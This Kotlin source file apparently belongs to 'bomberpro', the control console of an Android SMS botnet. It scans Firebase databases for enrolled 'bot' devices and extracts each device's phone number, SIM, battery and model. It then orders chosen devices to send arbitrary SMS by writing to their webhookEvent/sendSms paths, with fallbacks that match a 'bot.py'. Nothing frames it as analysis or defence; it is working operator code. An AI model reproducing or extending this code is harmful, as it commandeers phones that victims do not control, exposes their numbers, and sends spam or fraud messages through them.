package com.sanji.bomberpro.services

import com.google.firebase.firestore.FirebaseFirestore
import com.sanji.bomberpro.FirebaseConfig
import com.sanji.bomberpro.data.FirebaseNode
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit

data class Device(
    val firebaseUrl: String,
    val firebaseLabel: String,
    val firebaseId: String,
    val deviceId: String,
    val deviceName: String,
    val phone: String?,
    val battery: Int?,
    val sims: List<Map<String, Any?>>,
    val shortId: String,
    val lastSeen: Long,
    val model: String? = null,
    val android: String? = null,
)

data class SendResult(
    val ok: Boolean,
    val deviceId: String,
    val firebaseUrl: String,
    val error: String? = null,
)

class RealtimeDbService {

    private val http: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(8, TimeUnit.SECONDS)
        .build()

    private val jsonMedia = "application/json; charset=utf-8".toMediaType()

    // path cache: "fbId:devId" -> working message path
    private val pathCache = ConcurrentHashMap<String, String>()

    // ============================================================
    //  FIREBASES FROM FIRESTORE
    // ============================================================
    suspend fun loadFirebases(): List<FirebaseNode> = withContext(Dispatchers.IO) {
        try {
            val snap = FirebaseFirestore.getInstance()
                .collection(FirebaseConfig.COL_FIREBASES)
                .get()
                .await()

            val list = snap.documents.mapNotNull { doc ->
                val url = doc.getString("url") ?: return@mapNotNull null
                if (url.isBlank()) return@mapNotNull null
                FirebaseNode(
                    id = doc.id,
                    url = url,
                    label = doc.getString("label") ?: "Firebase",
                    enabled = doc.getBoolean("enabled") ?: true,
                )
            }.filter { it.enabled }

            if (list.isNotEmpty()) list
            else FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        } catch (e: Exception) {
            FirebaseConfig.DEFAULT_RTDB_URLS.mapIndexed { i, u ->
                FirebaseNode(id = "default_$i", url = u, label = "Firebase ${i + 1}", enabled = true)
            }
        }
    }

    // ============================================================
    //  SCAN — all firebases in parallel
    // ============================================================
    suspend fun scanAll(firebases: List<FirebaseNode>): List<Device> = withContext(Dispatchers.IO) {
        coroutineScope {
            firebases.map { fb -> async { scanFirebase(fb) } }.awaitAll().flatten()
        }
    }

    private suspend fun scanFirebase(fb: FirebaseNode): List<Device> {
        val out = mutableListOf<Device>()
        try {
            val url = fb.url.trimEnd('/') + FirebaseConfig.RTDB_CLIENTS
            val req = Request.Builder().url(url).get().build()
            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return emptyList()
                val body = resp.body?.string() ?: return emptyList()
                if (body.isBlank() || body == "null") return emptyList()

                val json = JSONObject(body)
                val ids = json.keys()

                while (ids.hasNext()) {
                    val devId = ids.next()
                    val dev = fetchDevice(fb, devId)
                    if (dev != null) out.add(dev)
                }
            }
        } catch (_: Exception) {
            // silent — firebase may be offline
        }
        return out
    }

    private fun fetchDevice(fb: FirebaseNode, devId: String): Device? {
        return try {
            val url = fb.url.trimEnd('/') + "/clients/$devId.json"
            val req = Request.Builder().url(url).get().build()
            http.newCall(req).execute().use { resp ->
                if (!resp.isSuccessful) return null
                val body = resp.body?.string() ?: return null
                if (body.isBlank() || body == "null") return null
                val obj = JSONObject(body)

                if (!isOnline(obj)) return null

                Device(
                    firebaseUrl = fb.url,
                    firebaseLabel = fb.label,
                    firebaseId = fb.id,
                    deviceId = devId,
                    deviceName = obj.optString("deviceName", obj.optString("name", "device")),
                    phone = extractPhone(obj),
                    battery = obj.optInt("battery", obj.optInt("batteryLevel", -1))
                        .takeIf { it in 0..100 },
                    sims = parseSims(obj),
                    shortId = shortCode(devId),
                    lastSeen = System.currentTimeMillis() / 1000L,
                    model = obj.optString("model", obj.optString("deviceModel", null)),
                    android = obj.optString("androidVersion", obj.optString("sdk", null)),
                )
            }
        } catch (_: Exception) {
            null
        }
    }

    // bot checks: isOnline, online, connected, active (bool), status, lastSeen
    private fun isOnline(obj: JSONObject): Boolean {
        if (obj.optBoolean("isOnline", false)) return true
        if (obj.optBoolean("online", false)) return true
        if (obj.optBoolean("connected", false)) return true
        if (obj.optBoolean("active", false)) return true
        val st = obj.optString("status", "").lowercase()
        if (st == "online" || st == "active" || st == "connected") return true
        val lastSeen = obj.optLong("lastSeen", obj.optLong("last_seen", 0L))
        val sec = if (lastSeen > 10_000_000_000L) lastSeen / 1000L else lastSeen
        if (sec > 0 && System.currentTimeMillis() / 1000L - sec < 60) return true
        return false
    }

    private fun extractPhone(obj: JSONObject): String? {
        val keys = listOf("phoneNumber", "phone", "number", "msisdn", "simNumber", "phone_number", "PhoneNumber")
        for (k in keys) {
            val v = obj.optString(k, "")
            if (v.isNotBlank() && v.length >= 7) return v
        }
        val simsArr = obj.optJSONArray("sims") ?: obj.optJSONArray("sim")
        if (simsArr != null) {
            for (i in 0 until simsArr.length()) {
                val s = simsArr.optJSONObject(i) ?: continue
                for (k in keys) {
                    val v = s.optString(k, "")
                    if (v.isNotBlank() && v.length >= 7) return v
                }
            }
        }
        return null
    }

    private fun parseSims(obj: JSONObject): List<Map<String, Any?>> {
        val sims = obj.optJSONArray("sims") ?: obj.optJSONArray("sim") ?: return emptyList()
        val out = mutableListOf<Map<String, Any?>>()
        for (i in 0 until sims.length()) {
            val s = sims.optJSONObject(i) ?: continue
            out.add(
                mapOf(
                    "simSlotIndex" to s.optInt("simSlotIndex", s.optInt("slot", 0)),
                    "phoneNumber" to s.optString("phoneNumber", null),
                )
            )
        }
        return out
    }

    private fun shortCode(devId: String): String {
        return if (devId.length <= 8) devId else "${devId.take(4)}…${devId.takeLast(4)}"
    }

    // ============================================================
    //  SEND SMS — 3-attempt fallback (matches bot.py)
    // ============================================================
    suspend fun sendSms(
        firebaseUrl: String,
        deviceId: String,
        simSlot: Int,
        to: String,
        message: String,
    ): SendResult = withContext(Dispatchers.IO) {
        val ts = System.currentTimeMillis() / 1000L
        val toEscaped = escapeJson(to)
        val msgEscaped = escapeJson(message)

        val attempts = listOf(
            // 1. webhookEvent/sendSms with int sim (bot primary)
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":$simSlot,"to":$toEscaped,"message":$msgEscaped,"isSended":false,"timestamp":$ts}"""
            ),
            // 2. webhookEvent/sendSms with string sim
            Pair(
                "/clients/$deviceId/webhookEvent/sendSms.json",
                """{"from":"$simSlot","to":$toEscaped,"message":$msgEscaped,"isSended":false,"timestamp":$ts}"""
            ),
            // 3. messages fallback
            Pair(
                "/clients/$deviceId/messages.json",
                """{"phone":$toEscaped,"text":$msgEscaped,"sim":$simSlot,"timestamp":$ts}"""
            ),
        )

        for ((path, body) in attempts) {
            try {
                val url = firebaseUrl.trimEnd('/') + path
                val req = Request.Builder()
                    .url(url)
                    .put(body.toRequestBody(jsonMedia))
                    .build()

                http.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        return@withContext SendResult(
                            ok = true,
                            deviceId = deviceId,
                            firebaseUrl = firebaseUrl,
                        )
                    }
                }
            } catch (_: Exception) {
                // try next attempt
            }
        }

        SendResult(
            ok = false,
            deviceId = deviceId,
            firebaseUrl = firebaseUrl,
            error = "all attempts failed",
        )
    }

    // ============================================================
    //  PATH CACHE — remembers which message path works per device
    // ============================================================
    fun getCachedPath(fbId: String, devId: String): String? =
        pathCache["$fbId:$devId"]

    fun setCachedPath(fbId: String, devId: String, path: String) {
        pathCache["$fbId:$devId"] = path
    }

    fun clearPathCache(fbId: String, devId: String) {
        pathCache.remove("$fbId:$devId")
    }

    // ============================================================
    //  JSON escape
    // ============================================================
    private fun escapeJson(s: String): String = JSONObject.quote(s)
}